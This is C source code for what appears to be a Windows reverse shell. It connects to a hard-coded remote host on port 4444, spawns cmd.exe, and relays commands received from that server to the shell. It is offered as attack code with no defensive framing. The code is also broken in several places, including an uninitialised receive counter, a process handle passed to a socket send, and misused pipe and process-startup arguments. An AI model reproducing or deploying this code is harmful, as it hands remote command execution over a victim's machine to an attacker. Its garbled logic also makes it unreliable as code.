#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <winsock2.h>

#define SERVER_IP "192.168.0.5"
#define SERVER_PORT 4444
#define SHELL_BUFFER_SIZE 1024
#define GOBUFSIZE 1024

int main() {
    WSADATA wsaData;
    SOCKET clientSocket;
    SOCKADDR_IN serverAddr;
    STARTUPINFO startupInfo;
    SECURITY_ATTRIBUTES securityAttributes;
    PROCESS_INFORMATION processInformation;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Failed to initialize Winsock");
        return -1;
    }

    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        perror("Failed to create socket");
        WSACleanup();
        return -1;
    }

    // Set up server address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &(serverAddr.sin_addr.s_addr));
    
    // Connect to the server
    if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        perror("Failed to connect to the server");
        closesocket(clientSocket);
        WSACleanup();
        return -1;
    } else {
        printf("Connected to the remote host.\n");
    }
    

    char shellCommandBuffer[SHELL_BUFFER_SIZE];
    memset(&shellCommandBuffer, '\0', SHELL_BUFFER_SIZE);

    while (1) {

        memset(&securityAttributes, 0, sizeof(securityAttributes));
        securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
        securityAttributes.bInheritHandle = TRUE;
        securityAttributes.lpSecurityDescriptor = NULL;

        // Create pipe for output redirection
        HANDLE hReadPipe, hWritePipe;
        if (!CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0)) {
            fprintf(stderr, "[!] Failed to create pipe: %d\n", GetLastError());
            continue;
        }
        
        if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0)) {
            fprintf(stderr, "[!] Failed to set handle information: %d\n", GetLastError());
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            continue;
        }

        // Spawn a new command shell process
        if (!CreateProcess(NULL, "cmd.exe", &securityAttributes, &securityAttributes,
                           TRUE, 0, (LPVOID)hWritePipe, NULL, &startupInfo,
                           &processInformation)) {
            fprintf(stderr, "[!] Failed to spawn shell process: %d\n", GetLastError());
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            continue;
        }

        memset(&shellCommandBuffer, '\0', SHELL_BUFFER_SIZE);

        DWORD bytesReceived;

        // Receive and execute shell commands from the server
        while (recv(clientSocket, shellCommandBuffer + strlen(shellCommandBuffer),
                    SHELL_BUFFER_SIZE - strlen(shellCommandBuffer) - 1, 0) > 0) {

            // Null-terminate received data
            shellCommandBuffer[bytesReceived] = '\0';

            // Check if the end of a shell command is reached
            if (bytesReceived > 0 && strcmp("\r\nexit", shellCommandBuffer) == 0) {
                break;
            }

            if (strcmp("\r\nwhoami", shellCommandBuffer) == 0 ||
                strcmp("\r\ncalc", shellCommandBuffer) == 0) {

                memset(&startupInfo, 0, sizeof(startupInfo));
                startupInfo.cb = sizeof(STARTUPINFO);
                startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError =
                    hReadPipe; // Redirect I/O to the read end of the pipe

                if (!CreateProcess(NULL, "cmd.exe", &securityAttributes, &securityAttributes,
                                   TRUE, 0, NULL, NULL, &startupInfo, &processInformation)) {
                    fprintf(stderr, "[!] Failed to spawn internal shell process: %d\n",
                            GetLastError());
                    continue;
                }

                memset(&shellCommandBuffer, '\0', SHELL_BUFFER_SIZE);
            } else {

                int writeSuccess = send(processInformation.hProcess, shellCommandBuffer, 
                                       strlen(shellCommandBuffer), 0);
                if (writeSuccess == SOCKET_ERROR) {
                    perror("Failed to send command to child process");
                    exit(-1);
                }
                
                memset(&shellCommandBuffer, '\0', SHELL_BUFFER_SIZE);
            }
        }

        // Wait for the spawned process to finish
        WaitForSingleObject(processInformation.hProcess, INFINITE);

        // Close handles
        CloseHandle(processInformation.hProcess);
        CloseHandle(processInformation.hThread);
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
    }

    // Cleanup
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}